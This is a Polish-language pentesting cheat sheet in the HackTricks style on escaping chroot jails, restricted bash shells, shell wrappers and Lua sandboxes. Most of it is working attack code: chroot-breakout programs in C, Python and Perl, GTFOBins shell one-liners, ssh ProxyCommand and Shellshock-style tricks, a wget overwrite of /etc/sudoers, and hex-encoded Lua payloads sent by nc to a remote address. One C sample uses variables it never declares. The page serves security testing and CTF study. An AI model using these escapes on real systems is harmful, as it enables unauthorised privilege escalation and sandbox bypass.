# Ucieczka z Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Szukaj w** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **czy możesz wykonać jakikolwiek binary z właściwością "Shell"**

## Ucieczki z Chroot

Z [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Mechanizm chroot **nie jest przeznaczony do obrony** przed celowym manipulowaniem przez **uprzywilejowanych** (**root**) **użytkowników**. W większości systemów konteksty chroot nie układają się poprawnie i programy uruchomione w chrootie **z wystarczającymi uprawnieniami mogą wykonać drugi chroot, aby się wydostać**.\
Zwykle oznacza to, że aby uciec, musisz być root wewnątrz chroot.

> [!TIP]
> **tool** [**chw00t**](https://github.com/earthquake/chw00t) został stworzony, aby nadużywać poniższych scenariuszy i uciec z `chroot`.

### Root + CWD

> [!WARNING]
> Jeśli jesteś **root** wewnątrz chroot, **możesz uciec**, tworząc **kolejny chroot**. Dzieje się tak, ponieważ 2 chrooty nie mogą współistnieć (w Linux), więc jeśli utworzysz folder, a następnie **utworzysz nowy chroot** w tym nowym folderze, będąc **na zewnątrz niego**, znajdziesz się teraz **poza nowym chrootem**, a więc będziesz w FS.
>
> Dzieje się tak, ponieważ zwykle chroot NIE przenosi twojego katalogu roboczego do wskazanego, więc możesz utworzyć chroot, ale być poza nim.

Zwykle nie znajdziesz binarnego `chroot` wewnątrz chroot jail, ale **możesz skompilować, przesłać i uruchomić** binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> To jest podobne do poprzedniego przypadku, ale tutaj **atakujący zapisuje deskryptor pliku bieżącego katalogu** a następnie **tworzy chroot w nowym folderze**. Na końcu, ponieważ ma **dostęp** do tego **FD** **poza** chroot, uzyskuje do niego dostęp i **ucieka**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD can be passed over Unix Domain Sockets, so:
>
> - Utwórz proces potomny (fork)
> - Utwórz UDS, aby parent i child mogły się komunikować
> - Uruchom chroot w procesie potomnym w innym folderze
> - W parent proc utwórz FD katalogu, który znajduje się poza nowym child proc chroot
> - Przekaż ten FD do child procc używając UDS
> - Child process wykonaj chdir do tego FD, a ponieważ jest on poza jego chroot, ucieknie z jail

### Root + Mount

> [!WARNING]
>
> - Montowanie urządzenia root (/) do katalogu wewnątrz chroot
> - Chrootowanie do tego katalogu
>
> Jest to możliwe w Linux

### Root + /proc

> [!WARNING]
>
> - Zamontuj procfs do katalogu wewnątrz chroot (jeśli jeszcze nie jest)
> - Poszukaj pid, który ma inne wpisy root/cwd, np.: /proc/1/root
> - Chroot do tego wpisu

### Root(?) + Fork

> [!WARNING]
>
> - Utwórz Fork (child proc) i chroot do innego folderu głębiej w FS oraz wykonaj na nim CD
> - Z parent process przenieś folder, w którym znajduje się child process, do folderu poprzedzającego chroot dzieci
> - Ten children process znajdzie się poza chroot

### ptrace

> [!WARNING]
>
> - Dawno temu users mogli debugować swoje własne procesy z procesu samego siebie... ale domyślnie nie jest to już możliwe
> - Tak czy inaczej, jeśli jest to możliwe, możesz użyć ptrace do procesu i wykonać w nim shellcode ([zobacz ten example](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Zdobądź info o jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modyfikuj PATH

Sprawdź, czy możesz zmodyfikować zmienną środowiskową PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Używanie vim
```bash
:set shell=/bin/sh
:shell
```
### Pagery i przeglądarki pomocy

Wiele ograniczonych środowisk nadal pozostawia dostępne **pagery** lub **przeglądarki pomocy**. Zwykle da się je nadużyć szybciej niż próbować odbudować `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Jeśli `git` jest dostępny, pamiętaj, że jego output pomocy zwykle przechodzi przez pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Common GTFOBins one-liners

Gdy już wiesz, które binaria są osiągalne, najpierw przetestuj oczywiste narzędzia uruchamiające shell:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Jeśli możesz tylko **wstrzykiwać argumenty** do dozwolonej komendy (zamiast uruchamiać ją swobodnie), sprawdź też **GTFOArgs**.

### Utwórz skrypt

Sprawdź, czy możesz utworzyć plik wykonywalny z zawartością _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Uzyskaj bash z SSH

Jeśli uzyskujesz dostęp przez ssh, często możesz poprosić serwer o uruchomienie **innego programu** zamiast ograniczonej powłoki logowania:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Jeśli `ssh` jest jednym z niewielu lokalnie dozwolonych binariów, pamiętaj, że można go także nadużyć jako **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Zadeklaruj
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Możesz nadpisać na przykład plik sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Niektóre środowiska nie wrzucają Cię do zwykłego `rbash`, ale do **wrapperów** takich jak `git-shell`, `rssh` lub `lshell`:

- `git-shell` akceptuje tylko komendy Git po stronie serwera oraz wszystko, co znajduje się w `~/git-shell-commands/`. Jeśli ten katalog istnieje, uruchom `help`, aby wylistować dozwolone niestandardowe akcje. Jeśli możesz tam **zapisywać**, każdy executable wrzucony do tego katalogu staje się dostępny.
- `rssh` / `lshell` zwykle pozwalają tylko na `scp`, `sftp`, `rsync` albo operacje w stylu Git. W takich przypadkach najpierw skup się na **file write primitives**: wgraj `authorized_keys`, plik startowy shella albo pomocniczy skrypt do miejsca, w którym masz zapis, a potem połącz się ponownie przez `ssh -t ...`.
- Jeśli wrapper filtruje tylko command line, wylistuj osiągalne binaries, a potem wróć do **GTFOBins / GTFOArgs**.

### Other tricks

Sprawdź też:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Może też zainteresować ta strona:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Triki dotyczące escaping z python jails znajdziesz na التالية stronie:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Na tej stronie znajdziesz global functions, do których masz dostęp wewnątrz lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Kilka trików, aby **wywoływać funkcje biblioteki bez używania kropek**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Wylicz funkcje biblioteki:
```bash
for k,v in pairs(string) do print(k,v) end
```
Zauważ, że za każdym razem, gdy wykonasz poprzedni one-liner w **innym środowisku lua, kolejność funkcji się zmienia**. Dlatego jeśli musisz wykonać jedną konkretną funkcję, możesz przeprowadzić brute force attack, ładując różne środowiska lua i wywołując pierwszą funkcję biblioteki:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Uzyskaj interaktywny shell lua**: Jeśli jesteś w ograniczonym shellu lua, możesz uzyskać nowy shell lua (i miejmy nadzieję nieograniczony), wywołując:
```bash
debug.debug()
```
## References

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
